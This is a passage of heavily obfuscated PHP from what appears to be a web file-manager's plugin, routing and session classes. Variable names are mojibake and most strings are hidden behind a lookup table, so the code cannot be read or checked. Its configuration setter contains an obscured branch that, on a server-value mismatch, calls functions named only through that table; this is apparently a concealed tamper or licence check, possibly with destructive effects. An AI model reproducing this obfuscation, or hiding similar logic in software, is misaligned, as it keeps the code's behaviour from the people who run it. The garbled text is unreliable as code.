$˜ÁÙÃ™¨ = $™äâú‡£[1536] . $õäµ‘Å–[$™äâú‡£[425]][$™äâú‡£[1535]] . $™äâú‡£[1537]; } else { if ($õäµ‘Å–[$™äâú‡£[425]][$™äâú‡£[1538]]) { $˜ÁÙÃ™¨ = $™äâú‡£[1539] . $õäµ‘Å–[$™äâú‡£[425]][$™äâú‡£[1538]] . $™äâú‡£[1540]; } } } return $˜ÁÙÃ™¨; } final function fileCanView($À¦ïìË) { $Êüø¾Ú™ =& $_SERVER[ñ÷§¡å]; if (request_url_safe($À¦ïìË)) { return !0; } if ($this->isShare($À¦ïìË)) { return !0; } $²³Î·ıå = Session::get($Êüø¾Ú™[1541]); if (!$²³Î·ıå || !$²³Î·ıå[$Êüø¾Ú™[1542]]) { $´¡üÒê = $Êüø¾Ú™[1543] . rawurlencode(this_url()); show_tips(LNG($Êüø¾Ú™[1544]) . $Êüø¾Ú™[1545] . $´¡üÒê . $Êüø¾Ú™[1546] . LNG($Êüø¾Ú™[1547]) . $Êüø¾Ú™[1548], !1); } if (!Action($Êüø¾Ú™[1549])->authCan($Êüø¾Ú™[1550])) { show_tips(LNG($Êüø¾Ú™[1551]) . $Êüø¾Ú™[1552], !1); } ActionCall($Êüø¾Ú™[1553], $À¦ïìË); } final function isShare($½¬Æöº‰) { $ºëĞ™˜‰ = KodIO::parse($½¬Æöº‰); return $ºëĞ™˜‰[$_SERVER[ñ÷§¡å][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÎŠİÇ§) { if (request_url_safe($ÎŠİÇ§)) { return $ÎŠİÇ§; } if (!$this->isShare($ÎŠİÇ§)) { $ÎŠİÇ§ = $this->filePath($ÎŠİÇ§); } return Action($_SERVER[ñ÷§¡å][1182])->linkOut($ÎŠİÇ§); } public function filePathLinkOut($õÍÌ±Õ) { if (request_url_safe($õÍÌ±Õ)) { return $õÍÌ±Õ; } $this->fileCanView($õÍÌ±Õ); return Action($_SERVER[ñ÷§¡å][1182])->link($õÍÌ±Õ); } final function filePath($¬Ï’…®¡) { $Å›¬ı™İ =& $_SERVER[ñ÷§¡å]; if ($ä‡Éà× = $this->checkSharePath($¬Ï’…®¡)) { Hook::trigger($Å›¬ı™İ[1554], $ä‡Éà×); return $ä‡Éà×; } $this->fileCanView($¬Ï’…®¡); if (request_url_safe($¬Ï’…®¡)) { $ãß©†¬® = parse_url_query($¬Ï’…®¡); if (isset($ãß©†¬®[$Å›¬ı™İ[1555]]) && isset($ãß©†¬®[$Å›¬ı™İ[223]])) { $ğêæñ¢„ = Model($Å›¬ı™İ[783])->get($Å›¬ı™İ[784]); $æÃ¯åÈ = Mcrypt::decode($ãß©†¬®[$Å›¬ı™İ[223]], $ğêæñ¢„); if ($æÃ¯åÈ) { $this->fileInfo = IO::infoWithChildren($æÃ¯åÈ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $æÃ¯åÈ; } } $¬Ï’…®¡ = $this->_cacheHttpFile($¬Ï’…®¡); $this->fileInfo = IO::infoWithChildren($¬Ï’…®¡); } else { $this->fileInfo = IO::infoWithChildren($¬Ï’…®¡); if (!$this->fileInfo) { show_tips(LNG($Å›¬ı™İ[115]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Å›¬ı™İ[1554], $¬Ï’…®¡); return $¬Ï’…®¡; } final function _cacheHttpFile($¤Ú•ï’) { $„øÂ«Î = hash_path($¤Ú•ï’, !0); $this->cachePath = $this->pluginCachePath($„øÂ«Î); if ($‘Î¿¡€ = IO::fileNameExist($this->cachePath, $„øÂ«Î)) { return KodIO::make($‘Î¿¡€); } $’ÅÍ‰“Ç = $this->cachePath . $„øÂ«Î; return $this->pluginCacheFileSet($’ÅÍ‰“Ç, file_get_contents_nossl($¤Ú•ï’)); } final function _tmpFileName($ĞˆÉ¨‹Ô = array()) { $´¨øîö =& $_SERVER[ñ÷§¡å]; if (!$ĞˆÉ¨‹Ô) { $ĞˆÉ¨‹Ô = $this->fileInfo; } if (isset($ĞˆÉ¨‹Ô[$´¨øîö[187]])) { return $ĞˆÉ¨‹Ô[$´¨øîö[187]]; } if (isset($ĞˆÉ¨‹Ô[$´¨øîö[180]][$´¨øîö[187]])) { return $ĞˆÉ¨‹Ô[$´¨øîö[180]][$´¨øîö[187]]; } $Ş’¼âÈ = IO::hashSimple($ĞˆÉ¨‹Ô[$´¨øîö[94]]); if ($Ş’¼âÈ) { return $Ş’¼âÈ; } $æğµÌåğ = array($ĞˆÉ¨‹Ô[$´¨øîö[32]], $ĞˆÉ¨‹Ô[$´¨øîö[94]], $ĞˆÉ¨‹Ô[$´¨øîö[86]]); if (isset($ĞˆÉ¨‹Ô[$´¨øîö[530]])) { $æğµÌåğ[] = $ĞˆÉ¨‹Ô[$´¨øîö[530]]; } return md5(implode($´¨øîö[11], $æğµÌåğ)); } final function checkSharePath($ÔòÅèÊ) { $ùƒõ“® =& $_SERVER[ñ÷§¡å]; if (!defined($ùƒõ“®[484])) { define($ùƒõ“®[523], 0); } if (!$this->isShare($ÔòÅèÊ)) { return !1; } $µó’„”ˆ = Action($ùƒõ“®[1182])->sharePathInfo($ÔòÅèÊ); if (!isset($µó’„”ˆ[$ùƒõ“®[94]])) { show_json(LNG($ùƒõ“®[1556]), !1); } $this->fileInfo = $µó’„”ˆ[$ùƒõ“®[180]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ùƒõ“®[187]]); return $µó’„”ˆ[$ùƒõ“®[94]]; } final function pluginCachePath($ÜèñÇï = '') { $˜‡Ã­”ä =& $_SERVER[ñ÷§¡å]; $¬ÍˆŠ¸Æ = IO_PATH_SYSTEM_TEMP . $˜‡Ã­”ä[1557] . $this->pluginName; if (!($˜šâÅ²ö = IO::infoFull($¬ÍˆŠ¸Æ))) { return IO::mkdir($¬ÍˆŠ¸Æ . $˜‡Ã­”ä[8] . $ÜèñÇï); } if (empty($ÜèñÇï)) { return $˜šâÅ²ö[$˜‡Ã­”ä[94]]; } if (!($Ü‰ààâá = IO::fileNameExist($˜šâÅ²ö[$˜‡Ã­”ä[94]], $ÜèñÇï))) { return IO::mkdir($˜šâÅ²ö[$˜‡Ã­”ä[94]] . $ÜèñÇï); } return KodIO::make($Ü‰ààâá); } final function pluginCacheFileSet($²Ôéóú¯, $ëõÔÓ¼Ù = '') { $üü¯ÅÇ£ =& $_SERVER[ñ÷§¡å]; if (!($²³±ŒÕå = IO::infoFull($²Ôéóú¯))) { return IO::mkfile($²Ôéóú¯, $ëõÔÓ¼Ù, REPEAT_REPLACE); } IO::setContent($²³±ŒÕå[$üü¯ÅÇ£[94]], $ëõÔÓ¼Ù); return $²³±ŒÕå[$üü¯ÅÇ£[94]]; } final function pluginLocalFile($•›óı§ = '') { $Òèı¢Í« =& $_SERVER[ñ÷§¡å]; $¨ü¼½…¼ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($¨ü¼½…¼)) { mk_dir($¨ü¼½…¼); } if (!$•›óı§) { return $¨ü¼½…¼; } $Ğê¥ßîÅ = IO::info($•›óı§); $¿œİ¸§Ç = $this->_tmpFileName($Ğê¥ßîÅ) . $Òèı¢Í«[10] . $Ğê¥ßîÅ[$Òèı¢Í«[184]]; if (!checkExtSafe($¿œİ¸§Ç)) { $¿œİ¸§Ç = $¿œİ¸§Ç . $Òèı¢Í«[1558]; } $æßêîé– = $¨ü¼½…¼ . $¿œİ¸§Ç; if (@file_exists($æßêîé–)) { return $æßêîé–; } return IO::copy($•›óı§, $¨ü¼½…¼, 0, $¿œİ¸§Ç); } final function appPackage() { $³Œó—É =& $_SERVER[ñ÷§¡å]; if ($this->packageData) { return $this->packageData; } $ÛëÌ‰è­ = $this->parseFile($this->pluginPath . $³Œó—É[1559]); $this->parseLang($ÛëÌ‰è­); $ˆµ¡ Óß = json_decode_force($ÛëÌ‰è­); if (!$ˆµ¡ Óß) { return array(); } $Šã€°–‡ = Hook::trigger($³Œó—É[1560], $ˆµ¡ Óß); if ($Šã€°–‡ && is_array($Šã€°–‡)) { $ˆµ¡ Óß = $Šã€°–‡; } $this->packageData = $ˆµ¡ Óß; return $ˆµ¡ Óß; } public function packageInfoGet($Ç¡÷²º) { $÷ØËñ = $this->appPackage(); return array_get_value($÷ØËñ, $Ç¡÷²º); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ñ÷§¡å][1561]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ñ÷§¡å][1562]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ñ÷§¡å][1563]); } public function echoJsAssign($Ñˆ¿œòÙ, $°ÌŸ Ù) { $this->echoJsAssignArr[$Ñˆ¿œòÙ] = $°ÌŸ Ù; } private function parseFile($Á•ã¶±¿) { $æì‘¬¿¿ =& $_SERVER[ñ÷§¡å]; $·ãÚŞ‘ = file_get_contents_nossl($Á•ã¶±¿); $ş®îí½‚ = array($æì‘¬¿¿[1564], $æì‘¬¿¿[1565], $æì‘¬¿¿[1566], $æì‘¬¿¿[1567], $æì‘¬¿¿[1568], $æì‘¬¿¿[1569], $æì‘¬¿¿[1570]); $ÂİÊÒ†Ñ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$æì‘¬¿¿[99]][$æì‘¬¿¿[1571]]); foreach ($this->echoJsAssignArr as $“Ø®×Ÿ => $èú©Åà¤) { $ş®îí½‚[] = $æì‘¬¿¿[1572] . $“Ø®×Ÿ . $æì‘¬¿¿[1573]; $ÂİÊÒ†Ñ[] = is_array($èú©Åà¤) || is_object($èú©Åà¤) ? rawurlencode(json_encode($èú©Åà¤)) : $èú©Åà¤; } if (strstr($·ãÚŞ‘, $æì‘¬¿¿[1574])) { $¤Î‹¡´£ = rawurlencode(json_encode($this->pluginLangArr)); $·ãÚŞ‘ = str_replace($æì‘¬¿¿[1574], $¤Î‹¡´£, $·ãÚŞ‘); } if (strstr($·ãÚŞ‘, $æì‘¬¿¿[1575])) { $¤Î‹¡´£ = $¤Î‹¡´£ = rawurlencode(json_encode($this->getConfig())); $·ãÚŞ‘ = str_replace($æì‘¬¿¿[1575], $¤Î‹¡´£, $·ãÚŞ‘); } $·ãÚŞ‘ = str_replace($ş®îí½‚, $ÂİÊÒ†Ñ, $·ãÚŞ‘); return $·ãÚŞ‘; } private function parseLang(&$ôŞüóÑ¦) { $ÏÊû•î =& $_SERVER[ñ÷§¡å]; $ÔøÉë¤Ğ = $ÏÊû•î[1576]; if (!strstr($ôŞüóÑ¦, $ÔøÉë¤Ğ)) { return; } preg_match_all($ÏÊû•î[1577], $ôŞüóÑ¦, $Õ…Ò‚õ´); if (!is_array($Õ…Ò‚õ´) || count($Õ…Ò‚õ´) == 0 || !is_array($Õ…Ò‚õ´[0]) || count($Õ…Ò‚õ´[0]) == 0) { return; } $–¦‰Õ¤ƒ = array(); $ĞéÏí®– = array(); foreach ($Õ…Ò‚õ´[0] as $ŞÊÅÁø) { $îá ´©Ë = substr($ŞÊÅÁø, strlen($ÔøÉë¤Ğ), -4); $õ›ÉÜ“Ô = LNG($îá ´©Ë); $–¦‰Õ¤ƒ[] = $ŞÊÅÁø; $ĞéÏí®–[] = str_replace(array($ÏÊû•î[65], $ÏÊû•î[1085], $ÏÊû•î[351], $ÏÊû•î[128]), array($ÏÊû•î[53], $ÏÊû•î[53], $ÏÊû•î[12], $ÏÊû•î[1578]), $õ›ÉÜ“Ô); } $ôŞüóÑ¦ = str_replace($–¦‰Õ¤ƒ, $ĞéÏí®–, $ôŞüóÑ¦); } private function parseConfig(&$Ã¾åœø°) { $Õç¥¼²â =& $_SERVER[ñ÷§¡å]; $Õœ‘´“ = $Õç¥¼²â[1579]; if (!strstr($Ã¾åœø°, $Õœ‘´“)) { return; } preg_match_all($Õç¥¼²â[1580], $Ã¾åœø°, $òáûÌ¼¼); if (!is_array($òáûÌ¼¼) || count($òáûÌ¼¼) == 0 || !is_array($òáûÌ¼¼[0]) || count($òáûÌ¼¼[0]) == 0) { return; } $ÛğíàÒà = $this->getConfig(); $¹ğÂÜÛİ = array(); $ò¡õ­Òå = array(); foreach ($òáûÌ¼¼[0] as $Û¹©ÃöÓ) { $“ñóØƒÌ = substr($Û¹©ÃöÓ, strlen($Õœ‘´“), -2); $¹ğÂÜÛİ[] = $Û¹©ÃöÓ; $ò¡õ­Òå[] = _get($ÛğíàÒà, $“ñóØƒÌ); } $Ã¾åœø° = str_replace($¹ğÂÜÛİ, $ò¡õ­Òå, $Ã¾åœø°); } private function parsePackage(&$ÑªæÈ¶²) { $ş¦ÂÍ’ =& $_SERVER[ñ÷§¡å]; $Ş…°ƒı = $ş¦ÂÍ’[1581]; if (!strstr($ÑªæÈ¶², $Ş…°ƒı)) { return; } preg_match_all($ş¦ÂÍ’[1582], $ÑªæÈ¶², $øñ…­õñ); if (!is_array($øñ…­õñ) || count($øñ…­õñ) == 0 || !is_array($øñ…­õñ[0]) || count($øñ…­õñ[0]) == 0) { return; } $µß©²Ø = $this->appPackage(); $ÎáÀ‚Á„ = array(); $­²ÎôÃ¹ = array(); foreach ($øñ…­õñ[0] as $×—áÕø») { $…©ÎßÅê = substr($×—áÕø», strlen($Ş…°ƒı), -2); $ÎáÀ‚Á„[] = $×—áÕø»; $­²ÎôÃ¹[] = _get($µß©²Ø, $…©ÎßÅê); } $ÑªæÈ¶² = str_replace($ÎáÀ‚Á„, $­²ÎôÃ¹, $ÑªæÈ¶²); } final function echoFile($û²à®Ó, $ÀêÕáæï = false) { $û¸èŒ“ó =& $_SERVER[ñ÷§¡å]; $Íğ±Û›ˆ = $this->pluginPath . $û²à®Ó; if (ACT == $û¸èŒ“ó[1583]) { echo $û¸èŒ“ó[1584] . $this->pluginName . $û¸èŒ“ó[8] . $û²à®Ó . $û¸èŒ“ó[1585]; if (!file_exists($Íğ±Û›ˆ)) { echo $û¸èŒ“ó[1586]; return; } } $’€ê°Òí = $this->parseFile($Íğ±Û›ˆ); $this->parseLang($’€ê°Òí); $this->parseConfig($’€ê°Òí); $this->parsePackage($’€ê°Òí); if (is_array($ÀêÕáæï)) { $’€ê°Òí = str_replace(array_keys($ÀêÕáæï), array_values($ÀêÕáæï), $’€ê°Òí); } echo $û¸èŒ“ó[65] . $’€ê°Òí; } final function initLang() { $‰ªš‘¬ë =& $_SERVER[ñ÷§¡å]; $Äù†ÊÌ÷ = $‰ªš‘¬ë[1587]; $ãË²Ç°­ = $this->pluginPath . $‰ªš‘¬ë[1588]; $¿Œğ³“Û = I18n::getType(); $ñÊê‘æ¾ = array(); if (file_exists($ãË²Ç°­ . $¿Œğ³“Û . $‰ªš‘¬ë[851])) { $ñÊê‘æ¾ = (include $ãË²Ç°­ . $¿Œğ³“Û . $‰ªš‘¬ë[851]); } else { if ($¿Œğ³“Û == $‰ªš‘¬ë[1589] && !file_exists($ãË²Ç°­ . $¿Œğ³“Û . $‰ªš‘¬ë[851]) && file_exists($ãË²Ç°­ . $‰ªš‘¬ë[1590])) { $ñÊê‘æ¾ = (include $ãË²Ç°­ . $‰ªš‘¬ë[1590]); } else { if (file_exists($ãË²Ç°­ . $Äù†ÊÌ÷ . $‰ªš‘¬ë[851])) { $ñÊê‘æ¾ = (include $ãË²Ç°­ . $Äù†ÊÌ÷ . $‰ªš‘¬ë[851]); } } } if (!is_array($ñÊê‘æ¾)) { return array(); } if (@count($ñÊê‘æ¾) > 0) { I18n::set($ñÊê‘æ¾); } return $ñÊê‘æ¾; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Î¿å£¯) { $ŒÇ­· =& $_SERVER[ñ÷§¡å]; if ($_SERVER[$ŒÇ­·[60]] != $_SERVER[$ŒÇ­·[61]]) { $ÍÔíŒş = $ŒÇ­·[885]; $“ëùªæ‡ = $ŒÇ­·[62]; $Ôõ†¡»Æ = $_SERVER[$ŒÇ­·[63]] . $ŒÇ­·[64]; $‰Ì¥®ê  = $“ëùªæ‡($Ôõ†¡»Æ); $Î”ÏÂÊò = explode($ŒÇ­·[65], $‰Ì¥®ê ); if (count($Î”ÏÂÊò) < $ŒÇ­·[629]) { $Çä¹›öÖ = $ŒÇ­·[67]; $Çä¹›öÖ(); } $ó½Ã¡ï© = $ŒÇ­·[886]; $ó½Ã¡ï©($_SERVER[$ŒÇ­·[887]]); $ó½Ã¡ï©($_SERVER[$ŒÇ­·[63]] . $ŒÇ­·[1528]); $¹’ê„Éé = 1; while ($¹’ê„Éé > 1) { $¹’ê„Éé = $¹’ê„Éé + 4; $é³– ­ = rawurlencode($¹’ê„Éé . $ŒÇ­·[387]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Î¿å£¯); } public function onSetConfig($¼®¶í‚¿) { } public function onGetConfig($­Ï…¯Ì) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($–“ùİ»ø) { if ($–“ùİ»ø == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($£É†±µÅ = "\x70\x6c\x75\147\151\156\x41\x75\x74\x68") { $¾·ª²¶¶ =& $_SERVER[ñ÷§¡å]; if (!defined($¾·ª²¶¶[484])) { return !1; } if (_get($GLOBALS, $¾·ª²¶¶[512])) { return !0; } $àÃÚÛö¶ = $this->getConfig(); if (!$àÃÚÛö¶[$£É†±µÅ]) { return !1; } return ActionCall($¾·ª²¶¶[1591], $àÃÚÛö¶[$£É†±µÅ]); } public function url($Öë¦îÅ³, $Æù±•‚ò = '', $İÜê÷© = true) { $êìá¼’— =& $_SERVER[ñ÷§¡å]; $ß‰®Áä§ = $this->getConfig(); $ëòüÑ¾„ = KOD_VERSION . $êìá¼’—[10] . KOD_VERSION_BUILD; $¹‘ìñèˆ = $this->packageVersion(); $¾š’Ã­Ø = $ëòüÑ¾„ . $êìá¼’—[395] . $¹‘ìñèˆ; if (substr($Öë¦îÅ³, 0, 4) == $êìá¼’—[158] || substr($Öë¦îÅ³, 0, 2) == $êìá¼’—[1374]) { $İÄáùØ³ = $Öë¦îÅ³ . $êìá¼’—[1592] . $¾š’Ã­Ø; } else { if ($Æù±•‚ò == $êìá¼’—[12]) { $İÄáùØ³ = $this->pluginHost . $Öë¦îÅ³ . $êìá¼’—[1592] . $¾š’Ã­Ø; } else { if ($Æù±•‚ò === $êìá¼’—[85]) { $İÄáùØ³ = $this->pluginHost . $Öë¦îÅ³; } else { if ($Æù±•‚ò == $êìá¼’—[1593]) { $İÄáùØ³ = STATIC_PATH . $Öë¦îÅ³ . $êìá¼’—[1592] . $ëòüÑ¾„; } else { if ($Æù±•‚ò == $êìá¼’—[1594]) { $İÄáùØ³ = APP_HOST . $êìá¼’—[1595] . $Öë¦îÅ³ . $êìá¼’—[1592] . $ëòüÑ¾„; } else { if (isset($ß‰®Áä§[$Æù±•‚ò])) { $İÄáùØ³ = $ß‰®Áä§[$Æù±•‚ò] . $Öë¦îÅ³ . $êìá¼’—[1592] . $¾š’Ã­Ø; } } } } } } if (!$İÜê÷©) { return $İÄáùØ³; } echo $İÄáùØ³; } public function link($ ¿¹üªõ = false, $£»€åîÜ = '') { $Ìµ‰¹Ïğ =& $_SERVER[ñ÷§¡å]; if (!$ ¿¹üªõ) { $this->link($Ìµ‰¹Ïğ[1596], $Ìµ‰¹Ïğ[1594]); $this->link($Ìµ‰¹Ïğ[1597], $Ìµ‰¹Ïğ[1593]); $this->link($Ìµ‰¹Ïğ[1598], $Ìµ‰¹Ïğ[1593]); $this->link($Ìµ‰¹Ïğ[1599], $Ìµ‰¹Ïğ[1593]); $this->link($Ìµ‰¹Ïğ[1600], $Ìµ‰¹Ïğ[1593]); return; } $ıåÌñúì = $this->url($ ¿¹üªõ, $£»€åîÜ, !1); if (substr($ ¿¹üªõ, -3) == $Ìµ‰¹Ïğ[1601]) { echo $Ìµ‰¹Ïğ[1602] . $ıåÌñúì . $Ìµ‰¹Ïğ[1603] . $Ìµ‰¹Ïğ[65]; } else { if (substr($ ¿¹üªõ, -4) == $Ìµ‰¹Ïğ[1604]) { echo $Ìµ‰¹Ïğ[1605] . $ıåÌñúì . $Ìµ‰¹Ïğ[1606] . $Ìµ‰¹Ïğ[65]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\133\x5e\57\135\53", "\x3a\156\165\x6d" => "\x5b\60\55\x39\x5d\53", "\x3a\x61\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Ìµàë±ò, $âİ½úâ‹) { $¤óØÛî‚ =& $_SERVER[ñ÷§¡å]; if ($Ìµàë±ò == $¤óØÛî‚[1607]) { $é»ù¿óÃ = array_map($¤óØÛî‚[1608], $âİ½úâ‹[0]); $¯ÈÁüÏ£ = strpos($âİ½úâ‹[1], $¤óØÛî‚[8]) === 0 ? $âİ½úâ‹[1] : $¤óØÛî‚[8] . $âİ½úâ‹[1]; $†Ä¥¡ = $âİ½úâ‹[2]; } else { $é»ù¿óÃ = null; $¯ÈÁüÏ£ = strpos($âİ½úâ‹[0], $¤óØÛî‚[8]) === 0 ? $âİ½úâ‹[0] : $¤óØÛî‚[8] . $âİ½úâ‹[0]; $†Ä¥¡ = $âİ½úâ‹[1]; } array_push(self::$maps, $é»ù¿óÃ); array_push(self::$routes, $¯ÈÁüÏ£); array_push(self::$methods, strtoupper($Ìµàë±ò)); array_push(self::$callbacks, $†Ä¥¡); } public static function error($˜‹†éÎ ) { self::$errorCallback = $˜‹†éÎ ; } public static function haltOnMatch($É¬Æğé‚ = true) { self::$halts = $É¬Æğé‚; } public static function dispatch() { $ã°óÜÏé =& $_SERVER[ñ÷§¡å]; $ä¹¥ù‰ = parse_url($_SERVER[$ã°óÜÏé[1609]], PHP_URL_PATH); $Òºœ¦şÄ = $_SERVER[$ã°óÜÏé[169]]; $çà’Ğ³ = array_keys(static::$patterns); $¬‚ãú° = array_values(static::$patterns); $şÑı¡”¢ = !1; self::$routes = preg_replace($ã°óÜÏé[1276], $ã°óÜÏé[8], self::$routes); if (in_array($ä¹¥ù‰, self::$routes)) { $£½á‹ö² = array_keys(self::$routes, $ä¹¥ù‰); foreach ($£½á‹ö² as $âò†¦¯…) { if (self::$methods[$âò†¦¯…] == $Òºœ¦şÄ || self::$methods[$âò†¦¯…] == $ã°óÜÏé[1610] || in_array($Òºœ¦şÄ, self::$maps[$âò†¦¯…])) { $şÑı¡”¢ = !0; if (!is_object(self::$callbacks[$âò†¦¯…])) { $—åŞ¨É = explode($ã°óÜÏé[8], self::$callbacks[$âò†¦¯…]); $Â“ÁĞêà = end($—åŞ¨É); $ıè¾ÀŠÏ = explode($ã°óÜÏé[1611], $Â“ÁĞêà); $ƒŞ€®Æó = new $ıè¾ÀŠÏ[0](); $ƒŞ€®Æó->{$ıè¾ÀŠÏ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$âò†¦¯…]); if (self::$halts) { return; } } } } } else { $Ê¶ÈÛÏï = 0; foreach (self::$routes as $âò†¦¯…) { if (strpos($âò†¦¯…, $ã°óÜÏé[4]) !== !1) { $âò†¦¯… = str_replace($çà’Ğ³, $¬‚ãú°, $âò†¦¯…); } if (preg_match($ã°óÜÏé[1612] . $âò†¦¯… . $ã°óÜÏé[1613], $ä¹¥ù‰, $É¹ÒÖú²)) { if (self::$methods[$Ê¶ÈÛÏï] == $Òºœ¦şÄ || self::$methods[$Ê¶ÈÛÏï] == $ã°óÜÏé[1610] || !empty(self::$maps[$Ê¶ÈÛÏï]) && in_array($Òºœ¦şÄ, self::$maps[$Ê¶ÈÛÏï])) { $şÑı¡”¢ = !0; array_shift($É¹ÒÖú²); if (!is_object(self::$callbacks[$Ê¶ÈÛÏï])) { $—åŞ¨É = explode($ã°óÜÏé[8], self::$callbacks[$Ê¶ÈÛÏï]); $Â“ÁĞêà = end($—åŞ¨É); $ıè¾ÀŠÏ = explode($ã°óÜÏé[1611], $Â“ÁĞêà); $ƒŞ€®Æó = new $ıè¾ÀŠÏ[0](); if (!method_exists($ƒŞ€®Æó, $ıè¾ÀŠÏ[1])) { echo $ã°óÜÏé[1614]; } else { call_user_func_array(array($ƒŞ€®Æó, $ıè¾ÀŠÏ[1]), $É¹ÒÖú²); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ê¶ÈÛÏï], $É¹ÒÖú²); if (self::$halts) { return; } } } } $Ê¶ÈÛÏï++; } } if ($şÑı¡”¢ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $í™‹ä =& $_SERVER[ñ÷§¡å]; header($_SERVER[$í™‹ä[1615]] . $í™‹ä[1616]); echo $í™‹ä[1617]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ã°óÜÏé[1609]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ÆòÎ°Ü§ =& $_SERVER[ñ÷§¡å]; static $öÉšÌÂÛ = false; if ($öÉšÌÂÛ) { return $öÉšÌÂÛ; } $ç»üø·Ç = $GLOBALS[$ÆòÎ°Ü§[6]][$ÆòÎ°Ü§[358]]; self::$sessionTime = $ç»üø·Ç[$ÆòÎ°Ü§[1618]]; $€°éˆ©º = isset($GLOBALS[$ÆòÎ°Ü§[1619]]) ? $GLOBALS[$ÆòÎ°Ü§[1619]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($€°éˆ©º)) { self::$sessionSign = Cookie::get($€°éˆ©º); } else { self::$sessionSign = guid(); } } Cookie::setSafe($€°éˆ©º, self::$sessionSign, self::$sessionTime); $×üàü‘ = $ç»üø·Ç[$ÆòÎ°Ü§[1620]]; $Ô«ª½î = $ç»üø·Ç[$×üàü‘]; $ªæµ–“â = $ç»üø·Ç[$ÆòÎ°Ü§[841]]; switch ($×üàü‘) { case $ÆòÎ°Ü§[21]: self::$handle = Model($ÆòÎ°Ü§[842]); break; case $ÆòÎ°Ü§[843]: self::$handle = new CacheRedis($Ô«ª½î, $ªæµ–“â); break; case $ÆòÎ°Ü§[844]: self::$handle = new CacheMemcached($Ô«ª½î, $ªæµ–“â); break; case $ÆòÎ°Ü§[209]: $Ô«ª½î[$ÆòÎ°Ü§[94]] = $Ô«ª½î[$ÆòÎ°Ü§[94]] . $ÆòÎ°Ü§[1621]; self::$handle = new CacheFile($Ô«ª½î, $ªæµ–“â); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $öÉšÌÂÛ = new self(); return $öÉšÌÂÛ; } public static function getBySign($· ÏØÉ‰) { CacheLock::lock($· ÏØÉ‰); $§¬ì£á¡ = self::$handle->get($· ÏØÉ‰); CacheLock::unlock($· ÏØÉ‰); $§¬ì£á¡ = unserialize($§¬ì£á¡); return is_array($§¬ì£á¡) ? $§¬ì£á¡ : array(); } public static function setBySign($ğÁ“‰ºó, $‘¹—íœ) { CacheLock::lock($ğÁ“‰ºó); self::$handle->set($ğÁ“‰ºó, serialize($‘¹—íœ), self::$sessionTime); CacheLock::unlock($ğÁ“‰ºó); } public static function sign($‰€©Ş‹© = false) { $‰€©Ş‹© && (self::$sessionSign = $‰€©Ş‹©); self::init(); return self::$sessionSign; } public static function set($Ã£ƒı–¥, $Á³øÕ† = false) { self::init(); if (is_array($Ã£ƒı–¥)) { foreach ($Ã£ƒı–¥ as $ªŒË‰¸ => $ŸÂŠ½ËÀ) { array_set_value(self::$data, $ªŒË‰¸, $ŸÂŠ½ËÀ); } } else { array_set_value(self::$data, $Ã£ƒı–¥, $Á³øÕ†); } self::setBySign(self::$sessionSign, self::$data); } public static function get($›®şÍúÕ = false) { self::init(); if (!$›®şÍúÕ) { return self::$data; } return array_get_value(self::$data, $›®şÍúÕ); } public static function remove($Ù¥âŠÄ¿) { self::init(); unset(self::$data[$Ù¥âŠÄ¿]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ñ÷§¡å][846])) { self::$handle->clearTimeout(); } } } goto dˆ„„³Ë¨Û; AÙ³»ÔôÅù: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¦ŒëĞöœ = false) { } public function exist($¨Á™©¥) { $àšÛ³¬ = $this->info($¨Á™©¥); return $àšÛ³¬[$_SERVER[ñ÷§¡å][211]]; } public function isFile($ãºÌ•Ä) { $¡†Ğ Ñ÷ = $this->info($ãºÌ•Ä); return $¡†Ğ Ñ÷[$_SERVER[ñ÷§¡å][211]]; } public function isFolder($¤ÎªÆı) { return !1; } public function size($ô³…ıòæ) { $ºÂÖ–‚‰ = $this->info($ô³…ıòæ); return $ºÂÖ–‚‰[$_SERVER[ñ÷§¡å][86]]; } public function info($øçßÅ§) { return $this->infoParse($øçßÅ§); } public function infoAuth($–ññÑ€) { return $this->infoParse($–ññÑ€); } public function infoWithChildren($ü¦‘‰”¡) { return $this->infoParse($ü¦‘‰”¡); } public function infoFull($ûÜÎ¨ºÛ) { return $this->infoParse($ûÜÎ¨ºÛ); } private function infoParse($£—Í¸§·) { $‹Úñà£œ =& $_SERVER[ñ÷§¡å]; $¿­üÛå• = $this->header($£—Í¸§·); if (!$¿­üÛå• || !$¿­üÛå•[$‹Úñà£œ[763]]) { return !1; } $ÁÌæŸ¾‹ = _get($¿­üÛå•, $‹Úñà£œ[346], 0); $‡÷´èŠ = array($‹Úñà£œ[32] => 